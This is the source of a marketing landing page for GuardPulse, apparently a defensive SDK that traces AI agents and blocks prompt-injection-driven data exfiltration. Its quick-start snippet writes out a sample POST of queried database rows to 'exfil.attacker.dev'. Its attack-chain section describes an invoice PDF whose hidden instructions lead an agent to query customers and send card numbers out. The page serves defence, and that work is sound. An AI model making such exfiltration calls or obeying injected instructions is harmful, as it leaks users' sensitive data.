import Link from 'next/link';
import { CodeTabs } from './components/CodeTabs';
import { Footer, Nav, REPO } from './components/Nav';
import { PulseField } from './components/PulseField';

const K = ({ children }: { children: React.ReactNode }) => <span className="c-key">{children}</span>;
const S = ({ children }: { children: React.ReactNode }) => <span className="c-str">{children}</span>;
const F = ({ children }: { children: React.ReactNode }) => <span className="c-fn">{children}</span>;
const C = ({ children }: { children: React.ReactNode }) => <span className="c-com">{children}</span>;

const NODE_RAW = `import { createGuard, Baseline } from 'guardpulse';

const baseline = new Baseline();               // Security Autopilot
const guard = createGuard({
  mode: 'shadow',                              // observe first, enforce later
  allowedDomains: ['api.acme.com', '*.openai.com'],
  observers: [baseline.observe],
});

const trace = guard.startTrace({
  agent: 'support-bot',
  task: 'Answer ticket #4521',
  allowedTools: ['tickets.read', 'tickets.reply'],
});

await trace.context({ source: attachmentUrl, text: pdfText });   // untrusted input
const rows = await trace.tool('db.query', args, () => db.query(args));
await trace.fetch('https://exfil.attacker.dev', { method: 'POST', body: rows });
// enforce mode → GuardBlockedError, the request never leaves

console.log((await trace.chain()).narrative);`;

const MCP_RAW = `import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { guardMcpClient } from 'guardpulse';

const client = new Client({ name: 'agent', version: '1.0.0' });
await client.connect(transport);

// every callTool goes through the policy, every tools/list feeds the baseline
const mcp = guardMcpClient(client, trace, { server: 'helpdesk' });
await mcp.listTools();     // tool description changed? → drift.tool_definition_changed
await mcp.callTool({ name: 'db.query', arguments: { sql } });`;

const NEXT_RAW = `// app/api/agent/route.ts
import { createGuard, collectorExporter, GuardBlockedError } from 'guardpulse';
import { trace as otel } from '@opentelemetry/api';

const guard = createGuard({
  mode: 'enforce',
  otel,                                         // reuse the active OTel trace id
  exporters: [collectorExporter(process.env.GUARDPULSE_COLLECTOR!)],
});

export async function POST(req: Request) {
  const t = guard.startTrace({ agent: 'copilot', task: 'chat' });
  try {
    return Response.json(await runAgent(await req.json(), t));
  } catch (err) {
    if (err instanceof GuardBlockedError) return Response.json({ blocked: err.decision }, { status: 403 });
    await t.error(err);
    throw err;
  }
}`;

const REPLAY_RAW = `# 1. record in shadow mode, export events
# 2. before the release, replay them through the new policy
npx guardpulse report events.jsonl
npx guardpulse replay events.jsonl --policy policy.next.json
#   + STOP  http https://api.partner.io/invoices  (alert → block, rule no-unknown-egress)
#   exit 1 → the new rule would break real traffic`;

export default function Home() {
  return (
    <>
      <Nav />
      <main id="main">
        <div className="hero">
          <PulseField />
          <div className="container">
            <div className="pills">
              <Link href="/demo/" className="pill pill-hot">v0.1 · attack chains + shadow mode</Link>
              <span className="pill">MCP · OpenTelemetry · SIEM</span>
            </div>
            <h1>
              See the <span className="grad">whole attack chain</span>,<br />not just the alert
            </h1>
            <p className="lead">
              GuardPulse lives inside your Node.js / Next.js app, links prompt injection, MCP tool calls and outbound requests into
              one graph, and stops the step that matters — <a href="#autopilot">in shadow mode first</a>, so production never breaks on a
              false positive.
            </p>
            <div className="cta">
              <Link className="btn btn-primary" href="/demo/">
                Run the live demo <span aria-hidden="true">→</span>
              </Link>
              <a className="btn btn-ghost" href={REPO}>
                Read the source
              </a>
            </div>
            <div className="term" aria-label="Install">
              <div className="term-bar">
                <i /> <i /> <i /> <span>install</span>
              </div>
              <pre>
                <span className="c-prompt">$</span> npm install guardpulse{'\n'}
                <span className="c-prompt">$</span> npx guardpulse collector --port 4319 <C># events → dashboard</C>
                {'\n'}
                <span className="c-prompt">$</span> npx guardpulse replay events.jsonl --policy next.json <C># gate a release</C>
              </pre>
            </div>
          </div>
        </div>

        <section id="chain">
          <div className="container">
            <div className="eyebrow">01 · Attack Chain Intelligence</div>
            <h2>Four signals. One story.</h2>
            <p className="sub">
              Each of these is a separate log line in a normal stack. GuardPulse keeps per-trace state — what entered, what the agent
              touched, where data is heading — so the fourth step is judged in the light of the first.
            </p>
            <div className="chain-strip">
              <div className="chain-step">
                <div className="num">STEP 1</div>
                <h3>Prompt injection</h3>
                <p>The agent reads an invoice PDF with hidden instructions.</p>
                <span className="tag tag-inj">untrusted · injection</span>
              </div>
              <div className="chain-step">
                <div className="num">STEP 2</div>
                <h3>Suspicious DB call</h3>
                <p>An MCP tool the task never needed: db.query on customers.</p>
                <span className="tag tag-tool">unexpected_tool · tainted</span>
              </div>
              <div className="chain-step">
                <div className="num">STEP 3</div>
                <h3>Exfiltration attempt</h3>
                <p>POST with card numbers to a domain nobody has seen before.</p>
                <span className="tag tag-egress">egress · sensitive</span>
              </div>
              <div className="chain-step">
                <div className="num">STEP 4</div>
                <h3>GuardPulse: BLOCK</h3>
                <p>The request never leaves. The whole chain is saved with its reason.</p>
                <span className="tag tag-block">exfil-after-injection</span>
              </div>
            </div>
          </div>
        </section>

        <div className="divider" />

        <section id="autopilot">
          <div className="container">
            <div className="eyebrow">02 · Two engines</div>
            <h2>Correlate. Then decide.</h2>
            <p className="sub">Deterministic rules you can read and test, plus an optional hook for an LLM analyst. No black box between you and a block.</p>
            <div className="grid-2">
              <div className="card">
                <span className="prio">PRIORITY 1</span>
                <h3>Attack Chain Intelligence</h3>
                <p>An interactive graph of source, agent, tools, APIs and consequences.</p>
                <ul>
                  <li>Taint tracking from untrusted input to every later step</li>
                  <li>Sensitive-data flow from tool results to outbound bodies</li>
                  <li>Traces joined with HTTP calls, errors and app events</li>
                  <li>Secrets redacted before anything is stored</li>
                </ul>
                <div className="stats">
                  <div className="stat"><b>6</b>event kinds</div>
                  <div className="stat"><b>3</b>edge types</div>
                  <div className="stat"><b>0</b>runtime deps</div>
                </div>
                <div className="glow" style={{ background: 'var(--pulse)' }} />
              </div>
              <div className="card violet">
                <span className="prio">PRIORITY 2</span>
                <h3>Security Autopilot</h3>
                <p>Learns normal, reports drift with evidence and a ready-to-paste rule.</p>
                <ul>
                  <li>New MCP tool for an agent, new external domain</li>
                  <li>Tool definition changed after deploy (rug-pull)</li>
                  <li>Request-rate spikes and new error types</li>
                  <li>Shadow mode: “would block”, without touching production</li>
                </ul>
                <div className="stats">
                  <div className="stat"><b>shadow</b>default mode</div>
                  <div className="stat"><b>per-rule</b>enforce</div>
                  <div className="stat"><b>replay</b>before release</div>
                </div>
                <div className="glow" style={{ background: 'var(--violet)' }} />
              </div>
            </div>
          </div>
        </section>

        <section style={{ paddingTop: 0 }}>
          <div className="container">
            <div className="eyebrow">03 · Rollout</div>
            <h2>Shadow first. Enforce what you trust.</h2>
            <p className="sub">The rollout that keeps a security tool from becoming the incident.</p>
            <div className="grid-3 steps">
              <div className="card step-card">
                <div className="n">01</div>
                <h3>Observe</h3>
                <p>Run with <code>mode: &apos;shadow&apos;</code>. Every decision is recorded as <code>would_block</code>; nothing is stopped.</p>
              </div>
              <div className="card step-card">
                <div className="n">02</div>
                <h3>Review &amp; pick</h3>
                <p>Read the shadow report, then set <code>mode: &apos;enforce&apos;</code> on just the rules you trust — the rest keep watching.</p>
              </div>
              <div className="card step-card">
                <div className="n">03</div>
                <h3>Replay before release</h3>
                <p><code>guardpulse replay</code> re-runs recorded chains through the new policy and fails the build if real traffic would break.</p>
              </div>
            </div>
          </div>
        </section>

        <div className="divider" />

        <section>
          <div className="container">
            <div className="eyebrow">04 · Quick start</div>
            <h2>Twenty lines in your app</h2>
            <p className="sub">The core is browser-safe TypeScript with no runtime dependencies. PostgreSQL and OpenTelemetry are optional peers.</p>
            <CodeTabs
              tabs={[
                {
                  label: 'Node.js',
                  raw: NODE_RAW,
                  code: (
                    <>
                      <K>import</K> {'{ createGuard, Baseline }'} <K>from</K> <S>&apos;guardpulse&apos;</S>;{'\n\n'}
                      <K>const</K> baseline = <K>new</K> <F>Baseline</F>(); <C>{'// Security Autopilot'}</C>
                      {'\n'}
                      <K>const</K> guard = <F>createGuard</F>({'{'}
                      {'\n'}  mode: <S>&apos;shadow&apos;</S>, <C>{'// observe first, enforce later'}</C>
                      {'\n'}  allowedDomains: [<S>&apos;api.acme.com&apos;</S>, <S>&apos;*.openai.com&apos;</S>],{'\n'}  observers: [baseline.observe],{'\n'}
                      {'});'}
                      {'\n\n'}
                      <K>const</K> trace = guard.<F>startTrace</F>({'{'}
                      {'\n'}  agent: <S>&apos;support-bot&apos;</S>,{'\n'}  task: <S>&apos;Answer ticket #4521&apos;</S>,{'\n'}  allowedTools: [<S>&apos;tickets.read&apos;</S>, <S>&apos;tickets.reply&apos;</S>],{'\n'}
                      {'});'}
                      {'\n\n'}
                      <K>await</K> trace.<F>context</F>({'{ source: attachmentUrl, text: pdfText }'}); <C>{'// untrusted input'}</C>
                      {'\n'}
                      <K>const</K> rows = <K>await</K> trace.<F>tool</F>(<S>&apos;db.query&apos;</S>, args, () =&gt; db.<F>query</F>(args));{'\n'}
                      <K>await</K> trace.<F>fetch</F>(<S>&apos;https://exfil.attacker.dev&apos;</S>, {'{ method: '}<S>&apos;POST&apos;</S>, body: rows {'}'});{'\n'}
                      <C>{'// enforce mode → GuardBlockedError, the request never leaves'}</C>
                      {'\n\n'}
                      console.<F>log</F>((<K>await</K> trace.<F>chain</F>()).narrative);
                    </>
                  ),
                },
                { label: 'MCP client', raw: MCP_RAW, code: MCP_RAW },
                { label: 'Next.js route', raw: NEXT_RAW, code: NEXT_RAW },
                { label: 'Replay in CI', raw: REPLAY_RAW, code: REPLAY_RAW },
              ]}
            />
          </div>
        </section>

        <section style={{ paddingTop: 0 }}>
          <div className="container center">
            <div className="eyebrow">05 · Architecture</div>
            <h2>Inside the app, not in front of it</h2>
            <p className="sub">It sees what goes through the SDK. Watching every process and socket needs a proxy or a sensor — that is a different tool, and a good companion.</p>
            <div className="arch">
              <div className="arch-row">
                <div className="arch-box"><b>Your Node.js / Next.js app</b><span>agents · MCP clients · fetch · errors</span></div>
              </div>
              <div className="arch-arrow">↓ trace.context · trace.tool · trace.fetch · guardMcpClient</div>
              <div className="arch-row">
                <div className="arch-box hot"><b>Attack Chain Intelligence</b><span>taint · sensitive flow · graph</span></div>
                <div className="arch-box vio"><b>Security Autopilot</b><span>policies · shadow/enforce · drift</span></div>
              </div>
              <div className="arch-arrow">↓ events (secrets redacted)</div>
              <div className="arch-row">
                <div className="arch-box"><b>PostgreSQL</b><span>or in-memory</span></div>
                <div className="arch-box"><b>Exporters</b><span>webhook · CEF / ECS · OTel</span></div>
                <div className="arch-box"><b>Collector → Dashboard</b><span>Next.js + React Flow</span></div>
              </div>
            </div>
          </div>
        </section>

        <div className="divider" />

        <section>
          <div className="container">
            <div className="eyebrow">06 · Where it fits</div>
            <h2>Not another agent firewall</h2>
            <p className="sub">Great tools already guard the edge. GuardPulse adds what you only see from inside the application.</p>
            <div className="table-wrap">
              <table>
                <thead>
                  <tr>
                    <th scope="col"></th>
                    <th scope="col">Egress firewall (e.g. Pipelock)</th>
                    <th scope="col">Trace rule checker (e.g. Invariant)</th>
                    <th scope="col">GuardPulse</th>
                  </tr>
                </thead>
                <tbody>
                  <tr><td>Where it runs</td><td>Proxy at the agent boundary</td><td>On agent traces</td><td className="us">In-process SDK in your app</td></tr>
                  <tr><td>Correlates app HTTP, errors and tool calls</td><td className="no">—</td><td>Agent trace only</td><td className="us yes">Yes, per trace</td></tr>
                  <tr><td>Attack-chain graph for humans</td><td className="no">—</td><td className="no">—</td><td className="us yes">React Flow dashboard</td></tr>
                  <tr><td>Shadow mode + per-rule enforce</td><td>Partial</td><td className="no">—</td><td className="us yes">Built in</td></tr>
                  <tr><td>Replay recorded chains before release</td><td className="no">—</td><td>Offline analysis</td><td className="us yes">CLI with exit code</td></tr>
                  <tr><td>Sees non-instrumented processes</td><td className="yes">Yes</td><td className="no">—</td><td className="us no">No — pair it with a proxy</td></tr>
                </tbody>
              </table>
            </div>
          </div>
        </section>

        <section style={{ paddingTop: 0 }}>
          <div className="container center">
            <div className="eyebrow">07 · Integrations</div>
            <h2>Fits the stack you run</h2>
            <p className="sub">Events leave as CEF or ECS for any SIEM, as OpenTelemetry spans next to your own traces, or as webhooks.</p>
            <div className="logos">
              {['Node.js', 'Next.js', 'MCP SDK', 'OpenTelemetry', 'PostgreSQL', 'Webhooks', 'CEF (ArcSight)', 'ECS (Elastic)', 'Microsoft Sentinel', 'Splunk'].map((l) => (
                <span key={l} className="logo-chip">{l}</span>
              ))}
            </div>
          </div>
        </section>

        <section className="final">
          <div className="container">
            <h2>
              Watch an agent get <span className="grad">hijacked</span> — then stopped
            </h2>
            <p className="sub" style={{ margin: '0 auto 32px' }}>One app, two runs: without GuardPulse and with it. Runs entirely in your browser.</p>
            <div className="cta" style={{ marginBottom: 0 }}>
              <Link className="btn btn-primary" href="/demo/">Open the live demo →</Link>
              <Link className="btn btn-ghost" href="/dashboard/">Explore the dashboard</Link>
            </div>
          </div>
        </section>
      </main>
      <Footer />
    </>
  );
}
